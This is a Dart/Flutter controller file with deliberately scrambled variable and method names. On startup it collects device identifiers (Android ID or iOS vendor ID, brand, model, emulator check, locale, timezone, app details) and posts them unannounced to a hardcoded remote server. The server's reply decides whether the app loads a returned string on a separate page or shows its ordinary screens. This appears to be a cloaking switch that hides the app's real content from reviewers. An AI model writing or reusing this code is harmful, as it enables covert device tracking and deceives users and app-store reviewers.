import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var cisxdmkao = RxBool(false);
  var fmvcuibrh = RxBool(true);
  var cibnlom = RxString("");
  var margot = RxBool(false);
  var mante = RxBool(true);
  final minwlvhgr = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    bfrvq();
  }


  Future<void> bfrvq() async {

    margot.value = true;
    mante.value = true;
    fmvcuibrh.value = false;

    minwlvhgr.post("https://taimei.zhiyin.one/johmsufrlcgqybvpknexwtzida",data: await ozkyejc()).then((value) {
      var pmoeg = value.data["pmoeg"] as String;
      var pdvzywq = value.data["pdvzywq"] as bool;
      if (pdvzywq) {
        cibnlom.value = pmoeg;
        celia();
      } else {
        sanford();
      }
    }).catchError((e) {
      fmvcuibrh.value = true;
      mante.value = true;
      margot.value = false;
    });
  }

  Future<Map<String, dynamic>> ozkyejc() async {
    final DeviceInfoPlugin wvaztenm = DeviceInfoPlugin();
    PackageInfo acbwvfn_eqidl = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var gdiw = Platform.localeName;
    var ifs_GBEnyme = currentTimeZone;

    var ifs_zF = acbwvfn_eqidl.packageName;
    var ifs_lSDfkH = acbwvfn_eqidl.version;
    var ifs_bDZc = acbwvfn_eqidl.buildNumber;

    var ifs_kPI = acbwvfn_eqidl.appName;
    var ifs_tHd = "";
    var ifs_mECr  = "";
    var mervinPagac = "";
    var ayanaFunk = "";
    var otisBoehm = "";
    var jakaylaAufderhar = "";
    var ifs_SjeGkAm = "";
    var maudieBrown = "";
    var harrisonWeber = "";
    var laurianeMcClure = "";
    var gerardStroman = "";


    var ifs_griRb = "";
    var ifs_tbgO = false;

    if (GetPlatform.isAndroid) {
      ifs_griRb = "android";
      var jiqyngcwpe = await wvaztenm.androidInfo;

      ifs_SjeGkAm = jiqyngcwpe.brand;

      ifs_tHd  = jiqyngcwpe.model;
      ifs_mECr = jiqyngcwpe.id;

      ifs_tbgO = jiqyngcwpe.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ifs_griRb = "ios";
      var pecjblqga = await wvaztenm.iosInfo;
      ifs_SjeGkAm = pecjblqga.name;
      ifs_tHd = pecjblqga.model;

      ifs_mECr = pecjblqga.identifierForVendor ?? "";
      ifs_tbgO  = pecjblqga.isPhysicalDevice;
    }
    var res = {
      "laurianeMcClure" : laurianeMcClure,
      "ifs_kPI": ifs_kPI,
      "ifs_lSDfkH": ifs_lSDfkH,
      "ifs_zF": ifs_zF,
      "ifs_tHd": ifs_tHd,
      "ifs_bDZc": ifs_bDZc,
      "ifs_SjeGkAm": ifs_SjeGkAm,
      "ifs_mECr": ifs_mECr,
      "gdiw": gdiw,
      "ifs_GBEnyme": ifs_GBEnyme,
      "ifs_griRb": ifs_griRb,
      "harrisonWeber" : harrisonWeber,
      "ifs_tbgO": ifs_tbgO,
      "otisBoehm" : otisBoehm,
      "jakaylaAufderhar" : jakaylaAufderhar,
      "maudieBrown" : maudieBrown,
      "ayanaFunk" : ayanaFunk,
      "mervinPagac" : mervinPagac,
      "gerardStroman" : gerardStroman,

    };
    return res;
  }

  Future<void> sanford() async {
    Get.offAllNamed("/sayTabPage");
  }

  Future<void> celia() async {
    Get.offAllNamed("/sayPo");
  }
}
